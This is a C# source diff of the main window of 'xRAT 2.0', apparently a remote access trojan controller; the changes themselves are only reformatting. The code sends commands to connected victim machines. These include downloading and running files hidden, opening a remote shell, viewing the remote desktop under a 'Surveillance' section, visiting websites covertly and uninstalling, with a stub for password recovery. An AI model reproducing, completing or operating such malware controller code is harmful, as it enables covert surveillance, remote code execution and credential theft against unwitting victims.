@@ -46,13 +46,15 @@ namespace xRAT_2.Forms
         {
             try
             {
-                this.Invoke((MethodInvoker)delegate
+                this.Invoke((MethodInvoker) delegate
                 {
 #if DEBUG
                     if (selected > 0)
-                        this.Text = string.Format("xRAT 2.0 - Connected: {0} [Selected: {1}] - Threads: {2}", count, selected, System.Diagnostics.Process.GetCurrentProcess().Threads.Count);
+                        this.Text = string.Format("xRAT 2.0 - Connected: {0} [Selected: {1}] - Threads: {2}", count,
+                            selected, System.Diagnostics.Process.GetCurrentProcess().Threads.Count);
                     else
-                        this.Text = string.Format("xRAT 2.0 - Connected: {0} - Threads: {1}", count, System.Diagnostics.Process.GetCurrentProcess().Threads.Count);
+                        this.Text = string.Format("xRAT 2.0 - Connected: {0} - Threads: {1}", count,
+                            System.Diagnostics.Process.GetCurrentProcess().Threads.Count);
 #else
                     if (selected > 0)
                         this.Text = string.Format("xRAT 2.0 - Connected: {0} [Selected: {1}]", count, selected);
@@ -62,48 +64,49 @@ namespace xRAT_2.Forms
                 });
             }
             catch
-            { }
+            {
+            }
         }
 
         private void frmMain_Load(object sender, EventArgs e)
         {
             listenServer = new Server(8192);
 
-            listenServer.AddTypesToSerializer(typeof(IPacket), new Type[]
+            listenServer.AddTypesToSerializer(typeof (IPacket), new Type[]
             {
-                typeof(Core.Packets.ServerPackets.InitializeCommand),
-                typeof(Core.Packets.ServerPackets.Disconnect),
-                typeof(Core.Packets.ServerPackets.Reconnect),
-                typeof(Core.Packets.ServerPackets.Uninstall),
-                typeof(Core.Packets.ServerPackets.DownloadAndExecute),
-                typeof(Core.Packets.ServerPackets.Desktop),
-                typeof(Core.Packets.ServerPackets.GetProcesses),
-                typeof(Core.Packets.ServerPackets.KillProcess),
-                typeof(Core.Packets.ServerPackets.StartProcess),
-                typeof(Core.Packets.ServerPackets.Drives),
-                typeof(Core.Packets.ServerPackets.Directory),
-                typeof(Core.Packets.ServerPackets.DownloadFile),
-                typeof(Core.Packets.ServerPackets.MouseClick),
-                typeof(Core.Packets.ServerPackets.GetSystemInfo),
-                typeof(Core.Packets.ServerPackets.VisitWebsite),
-                typeof(Core.Packets.ServerPackets.ShowMessageBox),
-                typeof(Core.Packets.ServerPackets.Update),
-                typeof(Core.Packets.ServerPackets.Monitors),
-                typeof(Core.Packets.ServerPackets.ShellCommand),
-                typeof(Core.Packets.ServerPackets.Rename),
-                typeof(Core.Packets.ServerPackets.Delete),
-                typeof(Core.Packets.ServerPackets.Action),
-                typeof(Core.Packets.ClientPackets.Initialize),
-                typeof(Core.Packets.ClientPackets.Status),
-                typeof(Core.Packets.ClientPackets.UserStatus),
-                typeof(Core.Packets.ClientPackets.DesktopResponse),
-                typeof(Core.Packets.ClientPackets.GetProcessesResponse),
-                typeof(Core.Packets.ClientPackets.DrivesResponse),
-                typeof(Core.Packets.ClientPackets.DirectoryResponse),
-                typeof(Core.Packets.ClientPackets.DownloadFileResponse),
-                typeof(Core.Packets.ClientPackets.GetSystemInfoResponse),
-                typeof(Core.Packets.ClientPackets.MonitorsResponse),
-                typeof(Core.Packets.ClientPackets.ShellCommandResponse)
+                typeof (Core.Packets.ServerPackets.InitializeCommand),
+                typeof (Core.Packets.ServerPackets.Disconnect),
+                typeof (Core.Packets.ServerPackets.Reconnect),
+                typeof (Core.Packets.ServerPackets.Uninstall),
+                typeof (Core.Packets.ServerPackets.DownloadAndExecute),
+                typeof (Core.Packets.ServerPackets.Desktop),
+                typeof (Core.Packets.ServerPackets.GetProcesses),
+                typeof (Core.Packets.ServerPackets.KillProcess),
+                typeof (Core.Packets.ServerPackets.StartProcess),
+                typeof (Core.Packets.ServerPackets.Drives),
+                typeof (Core.Packets.ServerPackets.Directory),
+                typeof (Core.Packets.ServerPackets.DownloadFile),
+                typeof (Core.Packets.ServerPackets.MouseClick),
+                typeof (Core.Packets.ServerPackets.GetSystemInfo),
+                typeof (Core.Packets.ServerPackets.VisitWebsite),
+                typeof (Core.Packets.ServerPackets.ShowMessageBox),
+                typeof (Core.Packets.ServerPackets.Update),
+                typeof (Core.Packets.ServerPackets.Monitors),
+                typeof (Core.Packets.ServerPackets.ShellCommand),
+                typeof (Core.Packets.ServerPackets.Rename),
+                typeof (Core.Packets.ServerPackets.Delete),
+                typeof (Core.Packets.ServerPackets.Action),
+                typeof (Core.Packets.ClientPackets.Initialize),
+                typeof (Core.Packets.ClientPackets.Status),
+                typeof (Core.Packets.ClientPackets.UserStatus),
+                typeof (Core.Packets.ClientPackets.DesktopResponse),
+                typeof (Core.Packets.ClientPackets.GetProcessesResponse),
+                typeof (Core.Packets.ClientPackets.DrivesResponse),
+                typeof (Core.Packets.ClientPackets.DirectoryResponse),
+                typeof (Core.Packets.ClientPackets.DownloadFileResponse),
+                typeof (Core.Packets.ClientPackets.GetSystemInfoResponse),
+                typeof (Core.Packets.ClientPackets.MonitorsResponse),
+                typeof (Core.Packets.ClientPackets.ShellCommandResponse)
             });
 
             listenServer.ServerState += serverState;
@@ -131,27 +134,26 @@ namespace xRAT_2.Forms
         {
             try
             {
-                this.Invoke((MethodInvoker)delegate
-                {
-                    botListen.Text = "Listening: " + listening.ToString();
-                });
+                this.Invoke((MethodInvoker) delegate { botListen.Text = "Listening: " + listening.ToString(); });
             }
             catch
-            { }
+            {
+            }
         }
 
         private void clientState(Server server, Client client, bool connected)
         {
             if (connected)
             {
-                client.Value = new UserState(); // Initialize the UserState so we can store values in there if we need to.
+                client.Value = new UserState();
+                    // Initialize the UserState so we can store values in there if we need to.
 
                 new Core.Packets.ServerPackets.InitializeCommand().Execute(client);
             }
             else
             {
                 foreach (ListViewItem lvi in lstClients.Items)
-                    if ((Client)lvi.Tag == client)
+                    if ((Client) lvi.Tag == client)
                     {
                         lvi.Remove();
                         server.ConnectedClients--;
@@ -166,51 +168,55 @@ namespace xRAT_2.Forms
 
             if (!client.Value.isAuthenticated)
             {
-                if (type == typeof(Core.Packets.ClientPackets.Initialize))
-                    CommandHandler.HandleInitialize(client, (Core.Packets.ClientPackets.Initialize)packet, this);
+                if (type == typeof (Core.Packets.ClientPackets.Initialize))
+                    CommandHandler.HandleInitialize(client, (Core.Packets.ClientPackets.Initialize) packet, this);
                 else
                     return;
             }
 
-            if (type == typeof(Core.Packets.ClientPackets.Status))
+            if (type == typeof (Core.Packets.ClientPackets.Status))
             {
-                CommandHandler.HandleStatus(client, (Core.Packets.ClientPackets.Status)packet, this);
+                CommandHandler.HandleStatus(client, (Core.Packets.ClientPackets.Status) packet, this);
             }
-            else if (type == typeof(Core.Packets.ClientPackets.UserStatus))
+            else if (type == typeof (Core.Packets.ClientPackets.UserStatus))
             {
-                CommandHandler.HandleUserStatus(client, (Core.Packets.ClientPackets.UserStatus)packet, this);
+                CommandHandler.HandleUserStatus(client, (Core.Packets.ClientPackets.UserStatus) packet, this);
             }
-            else if (type == typeof(Core.Packets.ClientPackets.DesktopResponse))
+            else if (type == typeof (Core.Packets.ClientPackets.DesktopResponse))
             {
-                CommandHandler.HandleRemoteDesktopResponse(client, (Core.Packets.ClientPackets.DesktopResponse)packet);
+                CommandHandler.HandleRemoteDesktopResponse(client, (Core.Packets.ClientPackets.DesktopResponse) packet);
             }
-            else if (type == typeof(Core.Packets.ClientPackets.GetProcessesResponse))
+            else if (type == typeof (Core.Packets.ClientPackets.GetProcessesResponse))
             {
-                CommandHandler.HandleGetProcessesResponse(client, (Core.Packets.ClientPackets.GetProcessesResponse)packet);
+                CommandHandler.HandleGetProcessesResponse(client,
+                    (Core.Packets.ClientPackets.GetProcessesResponse) packet);
             }
-            else if (type == typeof(Core.Packets.ClientPackets.DrivesResponse))
+            else if (type == typeof (Core.Packets.ClientPackets.DrivesResponse))
             {
-                CommandHandler.HandleDrivesResponse(client, (Core.Packets.ClientPackets.DrivesResponse)packet);
+                CommandHandler.HandleDrivesResponse(client, (Core.Packets.ClientPackets.DrivesResponse) packet);
             }
-            else if (type == typeof(Core.Packets.ClientPackets.DirectoryResponse))
+            else if (type == typeof (Core.Packets.ClientPackets.DirectoryResponse))
             {
-                CommandHandler.HandleDirectoryResponse(client, (Core.Packets.ClientPackets.DirectoryResponse)packet);
+                CommandHandler.HandleDirectoryResponse(client, (Core.Packets.ClientPackets.DirectoryResponse) packet);
             }
-            else if (type == typeof(Core.Packets.ClientPackets.DownloadFileResponse))
+            else if (type == typeof (Core.Packets.ClientPackets.DownloadFileResponse))
             {
-                CommandHandler.HandleDownloadFileResponse(client, (Core.Packets.ClientPackets.DownloadFileResponse)packet);
+                CommandHandler.HandleDownloadFileResponse(client,
+                    (Core.Packets.ClientPackets.DownloadFileResponse) packet);
             }
-            else if (type == typeof(Core.Packets.ClientPackets.GetSystemInfoResponse))
+            else if (type == typeof (Core.Packets.ClientPackets.GetSystemInfoResponse))
             {
-                CommandHandler.HandleGetSystemInfoResponse(client, (Core.Packets.ClientPackets.GetSystemInfoResponse)packet);
+                CommandHandler.HandleGetSystemInfoResponse(client,
+                    (Core.Packets.ClientPackets.GetSystemInfoResponse) packet);
             }
-            else if (type == typeof(Core.Packets.ClientPackets.MonitorsResponse))
+            else if (type == typeof (Core.Packets.ClientPackets.MonitorsResponse))
             {
-                CommandHandler.HandleMonitorsResponse(client, (Core.Packets.ClientPackets.MonitorsResponse)packet);
+                CommandHandler.HandleMonitorsResponse(client, (Core.Packets.ClientPackets.MonitorsResponse) packet);
             }
-            else if (type == typeof(Core.Packets.ClientPackets.ShellCommandResponse))
+            else if (type == typeof (Core.Packets.ClientPackets.ShellCommandResponse))
             {
-                CommandHandler.HandleShellCommandResponse(client, (Core.Packets.ClientPackets.ShellCommandResponse)packet);
+                CommandHandler.HandleShellCommandResponse(client,
+                    (Core.Packets.ClientPackets.ShellCommandResponse) packet);
             }
         }
 
@@ -237,232 +243,249 @@ namespace xRAT_2.Forms
         }
 
         #region "ContextMenu"
-            #region "Connection"
-            private void ctxtUpdate_Click(object sender, EventArgs e)
+
+        #region "Connection"
+
+        private void ctxtUpdate_Click(object sender, EventArgs e)
+        {
+            if (lstClients.SelectedItems.Count != 0)
             {
-                if (lstClients.SelectedItems.Count != 0)
+                frmUpdate frmU = new frmUpdate(lstClients.SelectedItems.Count);
+                if (frmU.ShowDialog() == System.Windows.Forms.DialogResult.OK)
                 {
-                    frmUpdate frmU = new frmUpdate(lstClients.SelectedItems.Count);
-                    if (frmU.ShowDialog() == System.Windows.Forms.DialogResult.OK)
+                    foreach (ListViewItem lvi in lstClients.SelectedItems)
+                    {
+                        Client c = (Client) lvi.Tag;
+                        new Core.Packets.ServerPackets.Update(_Update.DownloadURL).Execute(c);
+                    }
+                }
+            }
+        }
+
+        private void ctxtDisconnect_Click(object sender, EventArgs e)
+        {
+            foreach (ListViewItem lvi in lstClients.SelectedItems)
+            {
+                Client c = (Client) lvi.Tag;
+                new Core.Packets.ServerPackets.Disconnect().Execute(c);
+            }
+        }
+
+        private void ctxtReconnect_Click(object sender, EventArgs e)
+        {
+            foreach (ListViewItem lvi in lstClients.SelectedItems)
+            {
+                Client c = (Client) lvi.Tag;
+                new Core.Packets.ServerPackets.Reconnect().Execute(c);
+            }
+        }
+
+        private void ctxtUninstall_Click(object sender, EventArgs e)
+        {
+            if (
+                MessageBox.Show(
+                    string.Format(
+                        "Are you sure you want to uninstall the client on {0} computer\\s?\nThe clients won't come back!",
+                        lstClients.SelectedItems.Count), "Uninstall Confirmation", MessageBoxButtons.YesNo,
+                    MessageBoxIcon.Question) == System.Windows.Forms.DialogResult.Yes)
+            {
+                foreach (ListViewItem lvi in lstClients.SelectedItems)
+                {
+                    Client c = (Client) lvi.Tag;
+                    new Core.Packets.ServerPackets.Uninstall().Execute(c);
+                }
+            }
+        }
+
+        #endregion
+
+        #region "System"
+
+        private void ctxtSystemInformation_Click(object sender, EventArgs e)
+        {
+            if (lstClients.SelectedItems.Count != 0)
+            {
+                Client c = (Client) lstClients.SelectedItems[0].Tag;
+                if (c.Value.frmSI != null)
+                {
+                    c.Value.frmSI.Focus();
+                    return;
+                }
+                frmSystemInformation frmSI = new frmSystemInformation(c);
+                frmSI.Show();
+            }
+        }
+
+        private void ctxtDownloadAndExecute_Click(object sender, EventArgs e)
+        {
+            if (lstClients.SelectedItems.Count != 0)
+            {
+                using (var frm = new frmDownloadAndExecute(lstClients.SelectedItems.Count))
+                {
+                    if (frm.ShowDialog() == System.Windows.Forms.DialogResult.OK)
                     {
                         foreach (ListViewItem lvi in lstClients.SelectedItems)
                         {
-                            Client c = (Client)lvi.Tag;
-                            new Core.Packets.ServerPackets.Update(_Update.DownloadURL).Execute(c);
+                            Client c = (Client) lvi.Tag;
+                            new Core.Packets.ServerPackets.DownloadAndExecute(DownloadAndExecute.URL,
+                                DownloadAndExecute.RunHidden).Execute(c);
                         }
                     }
                 }
             }
+        }
 
-            private void ctxtDisconnect_Click(object sender, EventArgs e)
+        private void ctxtTaskManager_Click(object sender, EventArgs e)
+        {
+            if (lstClients.SelectedItems.Count != 0)
+            {
+                Client c = (Client) lstClients.SelectedItems[0].Tag;
+                if (c.Value.frmTM != null)
+                {
+                    c.Value.frmTM.Focus();
+                    return;
+                }
+                frmTaskManager frmTM = new frmTaskManager(c);
+                frmTM.Show();
+            }
+        }
+
+        private void ctxtFileManager_Click(object sender, EventArgs e)
+        {
+            if (lstClients.SelectedItems.Count != 0)
+            {
+                Client c = (Client) lstClients.SelectedItems[0].Tag;
+                if (c.Value.frmFM != null)
+                {
+                    c.Value.frmFM.Focus();
+                    return;
+                }
+                frmFileManager frmFM = new frmFileManager(c);
+                frmFM.Show();
+            }
+        }
+
+        private void ctxtPasswordRecovery_Click(object sender, EventArgs e)
+        {
+            if (lstClients.SelectedItems.Count != 0)
+            {
+                // TODO
+            }
+        }
+
+        private void ctxtRemoteShell_Click(object sender, EventArgs e)
+        {
+            if (lstClients.SelectedItems.Count != 0)
+            {
+                Client c = (Client) lstClients.SelectedItems[0].Tag;
+                if (c.Value.frmRS != null)
+                {
+                    c.Value.frmRS.Focus();
+                    return;
+                }
+                frmRemoteShell frmRS = new frmRemoteShell(c);
+                frmRS.Show();
+            }
+        }
+
+        private void ctxtShutdown_Click(object sender, EventArgs e)
+        {
+            if (lstClients.SelectedItems.Count != 0)
             {
                 foreach (ListViewItem lvi in lstClients.SelectedItems)
                 {
-                    Client c = (Client)lvi.Tag;
-                    new Core.Packets.ServerPackets.Disconnect().Execute(c);
+                    Client c = (Client) lvi.Tag;
+                    new Core.Packets.ServerPackets.Action(0).Execute(c);
                 }
             }
+        }
 
-            private void ctxtReconnect_Click(object sender, EventArgs e)
+        private void ctxtRestart_Click(object sender, EventArgs e)
+        {
+            if (lstClients.SelectedItems.Count != 0)
             {
                 foreach (ListViewItem lvi in lstClients.SelectedItems)
                 {
-                    Client c = (Client)lvi.Tag;
-                    new Core.Packets.ServerPackets.Reconnect().Execute(c);
+                    Client c = (Client) lvi.Tag;
+                    new Core.Packets.ServerPackets.Action(1).Execute(c);
                 }
             }
+        }
 
-            private void ctxtUninstall_Click(object sender, EventArgs e)
+        private void ctxtStandby_Click(object sender, EventArgs e)
+        {
+            if (lstClients.SelectedItems.Count != 0)
             {
-                if (MessageBox.Show(string.Format("Are you sure you want to uninstall the client on {0} computer\\s?\nThe clients won't come back!", lstClients.SelectedItems.Count), "Uninstall Confirmation", MessageBoxButtons.YesNo, MessageBoxIcon.Question) == System.Windows.Forms.DialogResult.Yes)
+                foreach (ListViewItem lvi in lstClients.SelectedItems)
                 {
-                    foreach (ListViewItem lvi in lstClients.SelectedItems)
-                    {
-                        Client c = (Client)lvi.Tag;
-                        new Core.Packets.ServerPackets.Uninstall().Execute(c);
-                    }
+                    Client c = (Client) lvi.Tag;
+                    new Core.Packets.ServerPackets.Action(2).Execute(c);
                 }
             }
-            #endregion
-            
-            #region "System"
-            private void ctxtSystemInformation_Click(object sender, EventArgs e)
+        }
+
+        #endregion
+
+        #region "Surveillance"
+
+        private void ctxtRemoteDesktop_Click(object sender, EventArgs e)
+        {
+            if (lstClients.SelectedItems.Count != 0)
             {
-                if (lstClients.SelectedItems.Count != 0)
+                Client c = (Client) lstClients.SelectedItems[0].Tag;
+                if (c.Value.frmRDP != null)
                 {
-                    Client c = (Client)lstClients.SelectedItems[0].Tag;
-                    if (c.Value.frmSI != null)
-                    {
-                        c.Value.frmSI.Focus();
-                        return;
-                    }
-                    frmSystemInformation frmSI = new frmSystemInformation(c);
-                    frmSI.Show();
+                    c.Value.frmRDP.Focus();
+                    return;
                 }
+                frmRemoteDesktop frmRDP = new frmRemoteDesktop(c);
+                frmRDP.Show();
             }
-            
-            private void ctxtDownloadAndExecute_Click(object sender, EventArgs e)
+        }
+
+        #endregion
+
+        #region "Miscellaneous"
+
+        private void ctxtVisitWebsite_Click(object sender, EventArgs e)
+        {
+            if (lstClients.SelectedItems.Count != 0)
             {
-                if (lstClients.SelectedItems.Count != 0)
+                using (var frm = new frmVisitWebsite(lstClients.SelectedItems.Count))
                 {
-                    using (var frm = new frmDownloadAndExecute(lstClients.SelectedItems.Count))
+                    if (frm.ShowDialog() == System.Windows.Forms.DialogResult.OK)
                     {
-                        if (frm.ShowDialog() == System.Windows.Forms.DialogResult.OK)
+                        foreach (ListViewItem lvi in lstClients.SelectedItems)
                         {
-                            foreach (ListViewItem lvi in lstClients.SelectedItems)
-                            {
-                                Client c = (Client)lvi.Tag;
-                                new Core.Packets.ServerPackets.DownloadAndExecute(DownloadAndExecute.URL, DownloadAndExecute.RunHidden).Execute(c);
-                            }
+                            Client c = (Client) lvi.Tag;
+                            new Core.Packets.ServerPackets.VisitWebsite(VisitWebsite.URL, VisitWebsite.Hidden).Execute(c);
                         }
                     }
                 }
             }
-            
-            private void ctxtTaskManager_Click(object sender, EventArgs e)
-            {
-                if (lstClients.SelectedItems.Count != 0)
-                {
-                    Client c = (Client)lstClients.SelectedItems[0].Tag;
-                    if (c.Value.frmTM != null)
-                    {
-                        c.Value.frmTM.Focus();
-                        return;
-                    }
-                    frmTaskManager frmTM = new frmTaskManager(c);
-                    frmTM.Show();
-                }
-            }
-            
-            private void ctxtFileManager_Click(object sender, EventArgs e)
-            {
-                if (lstClients.SelectedItems.Count != 0)
-                {
-                    Client c = (Client)lstClients.SelectedItems[0].Tag;
-                    if (c.Value.frmFM != null)
-                    {
-                        c.Value.frmFM.Focus();
-                        return;
-                    }
-                    frmFileManager frmFM = new frmFileManager(c);
-                    frmFM.Show();
-                }
-            }
-            
-            private void ctxtPasswordRecovery_Click(object sender, EventArgs e)
-            {
-                if (lstClients.SelectedItems.Count != 0)
-                {
-                    // TODO
-                }
-            }
-            
-            private void ctxtRemoteShell_Click(object sender, EventArgs e)
-            {
-                if (lstClients.SelectedItems.Count != 0)
-                {
-                    Client c = (Client)lstClients.SelectedItems[0].Tag;
-                    if (c.Value.frmRS != null)
-                    {
-                        c.Value.frmRS.Focus();
-                        return;
-                    }
-                    frmRemoteShell frmRS = new frmRemoteShell(c);
-                    frmRS.Show();
-                }
-            }
-            
-            private void ctxtShutdown_Click(object sender, EventArgs e)
-            {
-                if (lstClients.SelectedItems.Count != 0)
-                {
-                    foreach (ListViewItem lvi in lstClients.SelectedItems)
-                    {
-                        Client c = (Client)lvi.Tag;
-                        new Core.Packets.ServerPackets.Action(0).Execute(c);
-                    }
-                }
-            }
-            
-            private void ctxtRestart_Click(object sender, EventArgs e)
-            {
-                if (lstClients.SelectedItems.Count != 0)
-                {
-                    foreach (ListViewItem lvi in lstClients.SelectedItems)
-                    {
-                        Client c = (Client)lvi.Tag;
-                        new Core.Packets.ServerPackets.Action(1).Execute(c);
-                    }
-                }
-            }
-            
-            private void ctxtStandby_Click(object sender, EventArgs e)
-            {
-                if (lstClients.SelectedItems.Count != 0)
-                {
-                    foreach (ListViewItem lvi in lstClients.SelectedItems)
-                    {
-                        Client c = (Client)lvi.Tag;
-                        new Core.Packets.ServerPackets.Action(2).Execute(c);
-                    }
-                }
-            }
-            #endregion
+        }
 
-            #region "Surveillance"
-            private void ctxtRemoteDesktop_Click(object sender, EventArgs e)
+        private void ctxtShowMessagebox_Click(object sender, EventArgs e)
+        {
+            if (lstClients.SelectedItems.Count != 0)
             {
-                if (lstClients.SelectedItems.Count != 0)
+                Client c = (Client) lstClients.SelectedItems[0].Tag;
+                if (c.Value.frmSM != null)
                 {
-                    Client c = (Client)lstClients.SelectedItems[0].Tag;
-                    if (c.Value.frmRDP != null)
-                    {
-                        c.Value.frmRDP.Focus();
-                        return;
-                    }
-                    frmRemoteDesktop frmRDP = new frmRemoteDesktop(c);
-                    frmRDP.Show();
+                    c.Value.frmSM.Focus();
+                    return;
                 }
+                frmShowMessagebox frmSM = new frmShowMessagebox(c);
+                frmSM.Show();
             }
-            #endregion
-            
-            #region "Miscellaneous"
-            private void ctxtVisitWebsite_Click(object sender, EventArgs e)
-            {
-                if (lstClients.SelectedItems.Count != 0)
-                {
-                    using (var frm = new frmVisitWebsite(lstClients.SelectedItems.Count))
-                    {
-                        if (frm.ShowDialog() == System.Windows.Forms.DialogResult.OK)
-                        {
-                            foreach (ListViewItem lvi in lstClients.SelectedItems)
-                            {
-                                Client c = (Client)lvi.Tag;
-                                new Core.Packets.ServerPackets.VisitWebsite(VisitWebsite.URL, VisitWebsite.Hidden).Execute(c);
-                            }
-                        }
-                    }
-                }
-            }
-            
-            private void ctxtShowMessagebox_Click(object sender, EventArgs e)
-            {
-                if (lstClients.SelectedItems.Count != 0)
-                {
-                    Client c = (Client)lstClients.SelectedItems[0].Tag;
-                    if (c.Value.frmSM != null)
-                    {
-                        c.Value.frmSM.Focus();
-                        return;
-                    }
-                    frmShowMessagebox frmSM = new frmShowMessagebox(c);
-                    frmSM.Show();
-                }
-            }
-            #endregion
+        }
+
+        #endregion
+
         #endregion
 
         #region "MenuStrip"
+
         private void menuClose_Click(object sender, EventArgs e)
         {
             Application.Exit();
@@ -487,10 +510,13 @@ namespace xRAT_2.Forms
         private void menuStatistics_Click(object sender, EventArgs e)
         {
             if (listenServer.BytesReceived == 0 || listenServer.BytesSent == 0)
-                MessageBox.Show("Please wait for at least one connected Client!", "xRAT 2.0", MessageBoxButtons.OK, MessageBoxIcon.Information);
+                MessageBox.Show("Please wait for at least one connected Client!", "xRAT 2.0", MessageBoxButtons.OK,
+                    MessageBoxIcon.Information);
             else
             {
-                using (var frm = new frmStatistics(listenServer.BytesReceived, listenServer.BytesSent, listenServer.ConnectedClients, listenServer.AllTimeConnectedClients))
+                using (
+                    var frm = new frmStatistics(listenServer.BytesReceived, listenServer.BytesSent,
+                        listenServer.ConnectedClients, listenServer.AllTimeConnectedClients))
                 {
                     frm.ShowDialog();
                 }
@@ -504,14 +530,19 @@ namespace xRAT_2.Forms
                 frm.ShowDialog();
             }
         }
+
         #endregion
 
         #region "NotifyIcon"
+
         private void nIcon_MouseDoubleClick(object sender, MouseEventArgs e)
         {
-            this.WindowState = (this.WindowState == FormWindowState.Normal) ? FormWindowState.Minimized : FormWindowState.Normal;
+            this.WindowState = (this.WindowState == FormWindowState.Normal)
+                ? FormWindowState.Minimized
+                : FormWindowState.Normal;
             this.ShowInTaskbar = (this.WindowState == FormWindowState.Normal);
         }
+
         #endregion
     }
 }
